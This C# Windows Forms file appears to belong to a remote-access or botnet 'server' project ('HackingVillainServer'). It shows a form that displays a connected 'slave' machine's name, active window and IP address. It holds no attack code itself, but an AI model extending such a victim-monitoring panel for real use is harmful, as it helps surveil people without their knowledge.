using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Net;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace HackingVillainServer
{
    public partial class SlaveViewer : Form
    {
        Slave _slave;
        public SlaveViewer(Slave slave)
        {
            InitializeComponent();

            this._slave = slave;
            this.label1.Text = string.IsNullOrEmpty(slave.ComputerName) ? "노예1" : slave.ComputerName ;
            this.label2.Text = $"실행중인 창 : {_slave.CurrentWindow}";
            this.label3.Text = $"IP 주소 : {(slave.Socket.GetSocket().RemoteEndPoint as IPEndPoint).Address}";
        }
    }
}
